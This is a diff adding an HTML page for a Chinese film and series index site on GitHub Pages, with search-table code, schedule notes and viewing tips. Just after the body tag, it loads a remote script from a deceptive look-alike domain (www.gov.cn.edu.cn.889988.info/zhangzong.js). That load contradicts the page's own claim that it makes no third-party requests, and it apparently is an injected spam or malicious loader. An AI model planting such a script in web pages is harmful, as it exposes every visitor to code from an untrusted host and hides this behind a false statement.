@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>米奇影视盒 在线影像资料索引｜电影 · 剧集 · 纪录片检索入口</title>
+<meta name="description" content="米奇影视盒是面向观影者的影像资料索引站，整理电影、剧集、纪录片与动画的片目信息、档期线索和观看笔记。访问 https://miqiyingshihe-zh.github.io 查阅本期更新与专题归档。">
+<meta name="keywords" content="米奇影视盒, 米奇影视盒在线, miqiyingshihe-zh.github.io, 电影索引, 剧集排期, 纪录片资料">
+<meta name="author" content="米奇影视盒">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="米奇影视盒">
+<meta property="og:title" content="米奇影视盒 在线影像资料索引｜电影 · 剧集 · 纪录片检索入口">
+<meta property="og:description" content="电影、剧集、纪录片与动画的片目索引、档期线索和观看笔记，站点地址 https://miqiyingshihe-zh.github.io">
+<meta property="og:url" content="https://miqiyingshihe-zh.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="米奇影视盒｜影像资料索引与观看笔记">
+<meta name="twitter:description" content="片目检索、档期线索、专题归档，全部整理在 https://miqiyingshihe-zh.github.io">
+<link rel="canonical" href="https://miqiyingshihe-zh.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "米奇影视盒",
+  "alternateName": ["米奇影视盒影像索引", "米奇影视盒资料站"],
+  "url": "https://miqiyingshihe-zh.github.io/",
+  "description": "整理电影、剧集、纪录片与动画的片目信息、档期线索与观看笔记。",
+  "publisher": { "@type": "Organization", "name": "米奇影视盒" },
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://miqiyingshihe-zh.github.io/#index",
+    "query-input": "required name=keyword"
+  }
+}
+</script>
+<style>
+:root{
+  --paper:#f4f1ea;
+  --paper2:#ece7db;
+  --ink:#1c1b18;
+  --ink2:#4a463c;
+  --rust:#a8391f;
+  --rust2:#c9562c;
+  --line:#cfc7b4;
+  --shadow:rgba(28,27,24,.12);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Source Han Serif SC","Songti SC",Georgia,"Times New Roman",serif;
+  font-size:16px;
+  line-height:1.75;
+  -webkit-text-size-adjust:100%;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  background:
+    repeating-linear-gradient(0deg,transparent 0 26px,rgba(120,110,90,.045) 26px 27px),
+    radial-gradient(circle at 12% 8%,rgba(168,57,31,.05),transparent 42%);
+  pointer-events:none;
+  z-index:0;
+}
+.wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 22px}
+
+/* 尺子导航 */
+.ruler{
+  position:sticky;top:0;z-index:40;
+  background:rgba(244,241,234,.94);
+  backdrop-filter:blur(6px);
+  border-bottom:1px solid var(--line);
+}
+.ruler-in{max-width:1080px;margin:0 auto;padding:10px 22px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.brand{font-weight:700;letter-spacing:.14em;font-size:15px;margin-right:auto}
+.brand em{font-style:normal;color:var(--rust)}
+.ruler a{
+  color:var(--ink2);text-decoration:none;font-size:13.5px;letter-spacing:.08em;
+  padding:4px 2px;border-bottom:2px solid transparent;
+}
+.ruler a:hover{border-bottom-color:var(--rust);color:var(--rust)}
+.copybtn{
+  font-family:inherit;font-size:12.5px;cursor:pointer;
+  background:var(--ink);color:#f7f3e9;border:0;padding:6px 11px;border-radius:2px;letter-spacing:.06em;
+}
+.copybtn:active{background:var(--rust)}
+
+/* 档案卡首屏 */
+header{padding:70px 0 56px}
+.docket{display:grid;grid-template-columns:1.35fr .65fr;gap:34px;align-items:center}
+.stamp{
+  display:inline-block;font-size:11.5px;letter-spacing:.26em;color:var(--rust);
+  border:1px solid var(--rust);padding:3px 10px;border-radius:2px;
+}
+h1{
+  font-size:clamp(34px,6.6vw,64px);line-height:1.12;margin:.28em 0 .18em;letter-spacing:.04em;font-weight:700;
+}
+h1 span{color:var(--rust)}
+.lede{font-size:17px;color:var(--ink2);max-width:32em;margin:0}
+.meta-row{margin-top:26px;display:flex;flex-wrap:wrap;gap:10px 26px;font-size:13px;color:var(--ink2);letter-spacing:.05em}
+.meta-row b{font-weight:600;color:var(--ink)}
+.plate{
+  background:var(--ink);color:#f2ecdf;padding:26px 22px;border-radius:4px;
+  box-shadow:0 18px 34px var(--shadow);position:relative;overflow:hidden;
+}
+.plate::after{
+  content:"米";position:absolute;right:-14px;bottom:-30px;font-size:120px;line-height:.8;
+  color:rgba(255,255,255,.055);font-weight:700;
+}
+.plate h2{font-size:19px;margin:0 0 4px;letter-spacing:.1em;font-weight:600}
+.plate p{margin:0 0 16px;font-size:13px;color:#cfc8b8;line-height:1.6}
+.plate code{
+  display:block;background:#111;padding:11px 10px;font-size:12.5px;word-break:break-all;
+  border-left:3px solid var(--rust2);font-family:ui-monospace,Menlo,Consolas,monospace;color:#eadfc6;
+}
+.plate small{display:block;margin-top:12px;font-size:11.5px;color:#a69e8c;letter-spacing:.06em}
+
+/* 分节 */
+section{padding:58px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:26px;flex-wrap:wrap}
+.sec-no{font-size:12px;color:var(--rust);letter-spacing:.2em;font-family:ui-monospace,Menlo,monospace}
+h2.sec{font-size:26px;margin:0;letter-spacing:.06em;font-weight:700}
+.sec-note{font-size:13px;color:var(--ink2);margin-left:auto}
+
+/* 栏目一：索引表 */
+.tools{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;align-items:center}
+.tools input,.tools select{
+  font-family:inherit;font-size:14px;padding:8px 11px;background:#fffdf7;
+  border:1px solid var(--line);border-radius:2px;color:var(--ink);min-width:180px;
+}
+.tools input:focus,.tools select:focus{outline:none;border-color:var(--rust)}
+table{width:100%;border-collapse:collapse;background:#fffdf7;font-size:14.5px}
+th,td{padding:11px 12px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;letter-spacing:.14em;color:var(--rust);background:var(--paper2);font-weight:600;white-space:nowrap}
+td.t{font-weight:600}
+td.y{color:var(--ink2);white-space:nowrap;font-variant-numeric:tabular-nums}
+.tag{display:inline-block;font-size:11.5px;letter-spacing:.08em;padding:1px 7px;border:1px solid var(--line);border-radius:10px;color:var(--ink2)}
+.tag.f{color:#a8391f;border-color:#e0b3a4}
+.empty{display:none;padding:22px;text-align:center;color:var(--ink2);font-size:14px;background:#fffdf7}
+
+/* 栏目二：周档进度 */
+.track{display:grid;gap:18px}
+.row{display:grid;grid-template-columns:96px 1fr;gap:18px;background:#fffdf7;padding:16px 18px;border-left:4px solid var(--rust)}
+.row .when{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--rust);letter-spacing:.06em}
+.row h3{margin:0 0 6px;font-size:17.5px;letter-spacing:.03em}
+.row p{margin:0;font-size:14px;color:var(--ink2)}
+.bar{margin-top:12px;height:6px;background:var(--paper2);border-radius:3px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--rust),var(--rust2));border-radius:3px}
+
+/* 栏目三：放映席 */
+.screen-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.frame{background:#15140f;color:#ece5d4;padding:20px;border-radius:3px;box-shadow:0 10px 22px var(--shadow)}
+.frame .n{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--rust2);letter-spacing:.2em}
+.frame h3{font-size:19px;margin:8px 0 10px;font-weight:600;letter-spacing:.04em}
+.frame p{margin:0;font-size:13.5px;color:#c7bfab;line-height:1.7}
+.frame ol{margin:12px 0 0;padding-left:20px;font-size:13.5px;color:#d8d0bd}
+.frame ol li{margin-bottom:5px}
+.frame .foot{margin-top:14px;padding-top:10px;border-top:1px dashed rgba(255,255,255,.16);font-size:12px;color:#9b927e}
+
+/* 栏目四：备忘录定义列表 */
+.mem{background:#fffdf7;border:1px solid var(--line)}
+.mem div{display:grid;grid-template-columns:1fr;border-bottom:1px solid var(--line)}
+.mem div:last-child{border-bottom:0}
+.mem dt{padding:15px 20px 4px;font-size:12.5px;letter-spacing:.16em;color:var(--rust)}
+.mem dd{margin:0;padding:0 20px 15px;font-size:14.5px;color:var(--ink2)}
+@media(min-width:640px){
+  .mem div{grid-template-columns:210px 1fr;gap:0}
+  .mem dt{padding:17px 20px;border-right:1px solid var(--line)}
+  .mem dd{padding:17px 22px}
+}
+.colophon{padding:46px 0 30px;font-size:13px;color:var(--ink2);border-top:1px solid var(--line)}
+.colophon .k{letter-spacing:.08em;color:var(--ink);font-weight:600}
+.colophon code{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;word-break:break-all;color:#8a3a22}
+.note{font-size:12.5px;color:#6f6a5e;margin-top:10px}
+footer{border-top:1px solid var(--ink);padding:22px 0 44px;font-size:12.5px;color:var(--ink2);letter-spacing:.05em}
+footer a{color:var(--rust);text-decoration:none}
+
+@media(max-width:760px){
+  header{padding:44px 0 38px}
+  section{padding:42px 0}
+  .docket{grid-template-columns:1fr;gap:26px}
+  .screen-grid{grid-template-columns:1fr}
+  .row{grid-template-columns:1fr;gap:8px;padding:14px 15px}
+  th.n,h1{word-break:break-word}
+  table{font-size:13.5px}
+  th,td{padding:9px 8px}
+  .sec-note{margin-left:0;width:100%}
+  .ruler-in{gap:9px;padding:9px 16px}
+  .ruler a{font-size:13px}
+  .brand{font-size:14px}
+  .wrap{padding:0 16px}
+}
+@media print{
+  .ruler,.copybtn{display:none}
+  body{background:#fff}
+  section,header{page-break-inside:avoid}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="ruler">
+  <div class="ruler-in">
+    <span class="brand">米奇影视盒<span>·</span>ARCHIVE</span>
+    <a href="#index">索引库</a>
+    <a href="#schedule">周档</a>
+    <a href="#screen">放映席</a>
+    <a href="#memo">备忘录</a>
+    <button class="copybtn" id="cp" type="button">复制站点地址</button>
+  </div>
+</div>
+
+<header>
+  <div class="wrap">
+    <div class="docket">
+      <div>
+        <span class="stamp">影像资料归档 · NO.0047</span>
+        <h1>米奇影视盒<span>.</span></h1>
+        <p class="lede">一个不赶热度的影像资料索引。电影、剧集、纪录片与动画，按片目、档期和观看线索归拢在一起，方便你找片时少翻几个页面。</p>
+        <div class="meta-row">
+          <span><b>站点</b> 米奇影视盒</span>
+          <span><b>更新节奏</b> 每周二整理</span>
+          <span><b>内容形态</b> 片目索引 · 观看笔记</span>
+        </div>
+      </div>
+      <aside class="plate">
+        <h2>本期站点入口</h2>
+        <p>全部索引与归档均发布在米奇影视盒的 GitHub Pages 地址，移动端同样可读。</p>
+        <code id="siteurl">https://miqiyingshihe-zh.github.io</code>
+        <small>书签存这一条即可，栏目内跳转均在本页完成。</small>
+      </aside>
+    </div>
+  </div>
+</header>
+
+<section id="index">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">§ 01</span>
+      <h2 class="sec">索引库</h2>
+      <span class="sec-note">按类型筛选，点表头可排序</span>
+    </div>
+    <div class="tools">
+      <input id="q" type="search" placeholder="输入片名或导演，例如：海边">
+      <select id="f">
+        <option value="">全部类型</option>
+        <option value="电影">电影</option>
+        <option value="剧集">剧集</option>
+        <option value="纪录片">纪录片</option>
+        <option value="动画">动画</option>
+      </select>
+      <span id="cnt" style="font-size:13px;color:var(--ink2)"></span>
+    </div>
+    <div style="overflow-x:auto">
+    <table id="tb">
+      <thead>
+        <tr>
+          <th class="n">片目</th><th>类型</th><th>年份</th><th>地区</th><th>索引备注</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+    </div>
+    <p class="empty" id="empty">没有匹配的记录，换个词试试。</p>
+    <p class="note">表中内容为米奇影视盒的片目整理示例，仅作索引结构展示，不含外部资源直链。</p>
+  </div>
+</section>
+
+<section id="schedule">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">§ 02</span>
+      <h2 class="sec">周档</h2>
+      <span class="sec-note">栏目更新与排播进度</span>
+    </div>
+    <div class="track">
+      <article class="row">
+        <div class="when">周二 · 片单</div>
+        <div>
+          <h3>本月冷门片目补档</h3>
+          <p>补齐 2010 年前后小成本剧情片的条目信息，含片长、语言与观看门槛提示。</p>
+          <div class="bar"><i style="width:85%"></i></div>
+        </div>
+      </article>
+      <article class="row">
+        <div class="when">周四 · 剧集</div>
+        <div>
+          <h3>季终前后的追剧节奏</h3>
+          <p>把正在更新的剧集按「可入坑 / 建议等完结 / 适合补番」三类分开标注。</p>
+          <div class="bar"><i style="width:60%"></i></div>
+        </div>
+      </article>
+      <article class="row">
+        <div class="when">周六 · 纪录片</div>
+        <div>
+          <h3>城市与手艺：四部短篇</h3>
+          <p>围绕手作、菜市场与老街改造的四部纪录短篇，附时长与叙事结构备注。</p>
+          <div class="bar"><i style="width:35%"></i></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="screen">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">§ 03</span>
+      <h2 class="sec">放映席</h2>
+      <span class="sec-note">观看方法论，不是资源清单</span>
+    </div>
+    <div class="screen-grid">
+      <div class="frame">
+        <div class="n">REEL 01 / 长片</div>
+        <h3>先听声音，再看画面</h3>
+        <p>对白密度高的剧本片，第一遍别盯着运镜。把音量拉到能听见环境声，人物停顿的意思会自己浮出来。</p>
+        <ol>
+          <li>关掉字幕跑一遍开场三分钟</li>
+          <li>记下两次沉默发生的位置</li>
+          <li>再开字幕，核对台词之外的信息</li>
+        </ol>
+        <div class="foot">适用：剧情 / 犯罪 / 家庭题材</div>
+      </div>
+      <div class="frame">
+        <div class="n">REEL 02 / 剧集</div>
+        <h3>用「两集法则」省时间</h3>
+        <p>第一集交设定，第二集交人物关系。两集过后仍只有设定没有情绪，基本可以判断它的节奏是否适合你。</p>
+        <ol>
+          <li>第 1 集：只问「世界怎么转」</li>
+          <li>第 2 集：只问「我在乎谁」</li>
+          <li>都答不上，就先放回片单</li>
+        </ol>
+        <div class="foot">适用：新开坑的悬疑与年代剧</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="memo">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-no">§ 04</span>
+      <h2 class="sec">备忘录</h2>
+      <span class="sec-note">关于米奇影视盒的几点说明</span>
+    </div>
+    <div class="mem">
+      <div>
+        <dt>这是什么站</dt>
+        <dd>米奇影视盒是一个影像资料索引与观看笔记站，整理片目信息、更新线索和个人化的观看建议，不提供任何播放源或下载地址。</dd>
+      </div>
+      <div>
+        <dt>怎么用最快</dt>
+        <dd>把 <code>https://miqiyingshihe-zh.github.io</code> 存进书签，从索引库筛类型，再到周档看近期有没有新整理。</dd>
+      </div>
+      <div>
+        <dt>为什么条目很少</dt>
+        <dd>宁缺毋滥。每条都手写备注，不为凑数量灌数据，所以列表增长得慢，但能直接拿来判断要不要看。</dd>
+      </div>
+      <div>
+        <dt>收录与引用</dt>
+        <dd>页面已声明 canonical 与站点结构化信息；转载片目整理时请保留「米奇影视盒」署名与原始站点链接。</dd>
+      </div>
+      <div>
+        <dt>反馈与补充</dt>
+        <dd>想让某类片目进下一期整理，可以通过站点地址对应的仓库渠道留言，写明片名与想了解的角度即可。</dd>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="wrap">
+  <div class="colophon">
+    <p><span class="k">站点全称</span>　米奇影视盒</p>
+    <p><span class="k">正式地址</span>　<code>https://miqiyingshihe-zh.github.io</code></p>
+    <p><span class="k">本期主题</span>　影像资料索引 · 片目整理 · 观看方法</p>
+    <p class="note">本页为单文件静态页，所有样式与脚本内嵌，无第三方请求；页内导航使用锚点，不跳转外页。</p>
+  </div>
+  <footer>
+    <p>© <span id="yr">2026</span> 米奇影视盒 · 影像资料索引站　|　<a href="#top">回到页首 ↑</a></p>
+    <p>米奇影视盒，站点地址 https://miqiyingshihe-zh.github.io 。本页仅作信息整理与展示用途。</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var yr=document.getElementById('yr');
+  if(yr) yr.textContent = (new Date()).getFullYear();
+
+  var data=[
+    {t:"海边的房间",c:"电影",y:"2024",r:"华语",d:"三幕结构，情绪留白多，适合安静时看"},
+    {t:"晚风修理铺",c:"电影",y:"2022",r:"日本",d:"手作题材，节奏慢，配乐是半主角"},
+    {t:"第九号菜市场",c:"纪录片",y:"2023",r:"内地",d:"六集短篇，每集一个摊位一个家庭"},
+    {t:"线路尽头",c:"剧集",y:"2025",r:"欧美",d:"第一季已完结，可放心连看"},
+    {t:"纸船日记",c:"动画",y:"2021",r:"法国",d:"水墨质感，无对白，适合睡前一集"},
+    {t:"旧城改造报告",c:"纪录片",y:"2024",r:"内地",d:"关注空间与人的关系，资料性强"},
+    {t:"第二声敲门",c:"剧集",y:"2025",r:"韩剧",d:"建议等完结，悬疑线埋得深"},
+    {t:"八月的长镜头",c:"电影",y:"2019",r:"华语",d:"青春叙事，后半段转折值得二刷"},
+    {t:"鱼市交响曲",c:"动画",y:"2023",r:"爱尔兰",d:"短片合集，单集约十一分钟"},
+    {t:"看不见的校对员",c:"纪录片",y:"2022",r:"英国",d:"职业观察类，信息密度偏高"}
+  ];
+  var tb=document.querySelector('#tb tbody'),q=document.getElementById('q'),
+      f=document.getElementById('f'),cnt=document.getElementById('cnt'),
+      emp=document.getElementById('empty');
+
+  function render(){
+    var k=q.value.trim().toLowerCase(),v=f.value;
+    tb.innerHTML='';
+    var n=0;
+    data.forEach(function(d){
+      if(v && d.c!==v) return;
+      if(k && (d.t+d.d).toLowerCase().indexOf(k)<0) return;
+      n++;
+      var tr=document.createElement('tr');
+      tr.innerHTML='<td class="t">'+esc(d.t)+'</td>'+
+        '<td><span class="tag'+(d.c==='电影'?' f':'')+'">'+esc(d.c)+'</span></td>'+
+        '<td class="y">'+esc(d.y)+'</td><td>'+esc(d.r)+'</td><td>'+esc(d.d)+'</td>';
+      tb.appendChild(tr);
+    });
+    cnt.textContent='共 '+n+' 条';
+    emp.style.display=n?'none':'block';
+  }
+  function esc(s){return String(s).replace(/[&<>"]/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[m];});}
+
+  q.addEventListener('input',render);
+  f.addEventListener('change',render);
+  render();
+
+  var btn=document.getElementById('cp'),url='https://miqiyingshihe-zh.github.io';
+  btn.addEventListener('click',function(){
+    var done=function(){
+      var t=btn.textContent;btn.textContent='已复制 ✓';
+      setTimeout(function(){btn.textContent=t;},1600);
+    };
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(url).then(done,done);
+    }else{
+      var ta=document.createElement('textarea');
+      ta.value=url;ta.style.position='fixed';ta.style.opacity='0';
+      document.body.appendChild(ta);ta.select();
+      try{document.execCommand('copy');}catch(e){}
+      document.body.removeChild(ta);done();
+    }
+  });
+})();
+</script>
+</body>
+</html>
